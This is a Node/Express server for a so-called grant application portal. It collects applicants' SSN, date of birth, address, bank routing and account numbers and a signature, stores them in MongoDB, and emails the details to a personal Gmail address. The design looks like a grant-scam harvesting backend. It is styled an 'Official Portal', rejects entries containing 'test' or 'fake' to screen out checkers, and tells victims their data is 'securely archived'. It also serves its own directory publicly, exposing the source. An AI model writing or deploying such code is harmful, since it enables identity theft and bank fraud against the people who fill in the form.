import express from "express";
import mongoose from "mongoose";
import nodemailer from "nodemailer";
import bodyParser from "body-parser";
import cors from "cors";
import path from 'path';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = process.env.PORT || 5000;

// Allow requests from your frontend (adjust port if needed, usually 3000 or 5173)
app.use(cors({
  origin: "*", // For development only. In production, restrict to your domain.
  methods: ["POST", "GET"]
}));

app.use(bodyParser.json());

// --- SERVE STATIC FILES (Deployment) ---
// Serve static files from the 'dist' directory (standard build output)
// or current directory fallback if no build process is present
app.use(express.static(path.join(__dirname, 'dist')));
app.use(express.static(__dirname));

// --- DATABASE CONNECTION ---
// Ensure you have MongoDB running locally
const MONGO_URI = process.env.MONGO_URI || "mongodb://localhost:27017/grant_portal";

mongoose.connect(MONGO_URI)
  .then(() => console.log("Connected to MongoDB"))
  .catch(err => console.error("MongoDB connection error:", err));

// --- SCHEMA ---
// Matches the formData state in pages/Apply.tsx
const ApplicationSchema = new mongoose.Schema({
  grantId: { type: String, required: true },
  fullName: { type: String, required: true },
  dob: String,
  phone: String,
  email: { type: String, required: true },
  address: String,
  
  // Optional Security Field (SSN or EIN)
  ssn: String,
  
  // Banking Info (In production, these must be encrypted)
  bankName: String,
  routingNumber: String, // Mapped from 'branch' in frontend
  accountName: String,
  accountNumber: String,
  
  // Certification
  certification: Boolean,
  signature: { type: String, required: true }, // Digital Signature
  
  status: { type: String, default: "Pending Review" },
  submittedAt: { type: Date, default: Date.now },
});

// COMPOUND INDEX: Prevents the same email from applying for the same Grant ID twice.
ApplicationSchema.index({ email: 1, grantId: 1 }, { unique: true });

const Application = mongoose.model("Application", ApplicationSchema);

// --- EMAIL TRANSPORT ---
// Configure with real SMTP credentials or use Ethereal for testing
const transporter = nodemailer.createTransport({
  service: "gmail", // Or your SMTP provider
  auth: {
    user: process.env.EMAIL_USER || "admin@example.com", 
    pass: process.env.EMAIL_PASS || "password",   
  },
});

// --- HELPER: DETECT FAKE DATA ---
const isSuspicious = (data) => {
  const patterns = [
    /test/i, 
    /demo/i, 
    /fake/i, 
    /123456789/, 
    /987654321/, 
    /000000000/,
    /555-555-5555/,
    /123 Main St/i
  ];
  
  const values = Object.values(data).join(' ');
  return patterns.some(pattern => pattern.test(values));
};

// --- ROUTE TO HANDLE FORM SUBMISSION ---
app.post("/submit", async (req, res) => {
  try {
    console.log("Received submission:", req.body);
    
    // 1. Server-Side Validation checks
    if (isSuspicious(req.body)) {
       return res.status(400).json({ 
         success: false, 
         message: "Submission flagged for invalid or test data. Please provide verifiable information." 
       });
    }

    // 2. Server-Side Signature Integrity Check
    // Ensure the digital signature matches the provided name (case-insensitive)
    if (!req.body.signature || req.body.signature.trim().toLowerCase() !== req.body.fullName.trim().toLowerCase()) {
       return res.status(400).json({ 
         success: false, 
         message: "Certification Failed: Digital Signature does not match the applicant's full legal name." 
       });
    }

    // Map frontend 'branch' to 'routingNumber'
    const applicationData = {
      ...req.body,
      routingNumber: req.body.branch 
    };

    // 3. Save to Database
    const application = new Application(applicationData);
    await application.save();

    // 4. Send Admin Notification Email
    // Note: This block is wrapped in try/catch so DB save succeeds even if email fails (common in dev)
    try {
      await transporter.sendMail({
        from: process.env.EMAIL_USER || "admin@example.com",
        to: "anne67j@gmail.com", // Specific recipient as requested
        subject: `New Grant Application: ${req.body.fullName}`,
        text: `
          New Application Received from Official Portal.
          
          --- APPLICANT DETAILS ---
          Name: ${req.body.fullName}
          DOB: ${req.body.dob}
          Email: ${req.body.email}
          Phone: ${req.body.phone}
          Address: ${req.body.address}
          
          --- GRANT DETAILS ---
          Program ID: ${req.body.grantId}
          
          --- BANKING & SECURITY ---
          Bank Name: ${req.body.bankName}
          Account Holder: ${req.body.accountName}
          (Sensitive account numbers stored securely in database)
          
          --- CERTIFICATION ---
          Signed By: ${req.body.signature}
          Date: ${new Date().toLocaleString()}
          
          Status: Pending Review
          
          View full details in the secure dashboard.
        `,
      });
      console.log("Notification email sent to anne67j@gmail.com");
    } catch (emailError) {
      console.warn("Email failed to send (check credentials):", emailError.message);
    }

    // 5. Return Success
    res.status(200).json({ 
      success: true, 
      message: "Application securely archived.", 
      referenceId: application._id 
    });

  } catch (error) {
    console.error("Error saving application:", error);
    
    // Handle Duplicate Key Error (MongoDB Code 11000)
    if (error.code === 11000) {
      return res.status(409).json({ 
        success: false, 
        message: "Duplicate Application: An application for this Grant ID has already been submitted with this email address." 
      });
    }

    res.status(500).json({ success: false, message: "Internal Server Error" });
  }
});

// --- SPA FALLBACK ---
// Send index.html for any other requests to support client-side routing
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// --- START SERVER ---
app.listen(PORT, () => console.log(`Server running securely on http://localhost:${PORT}`));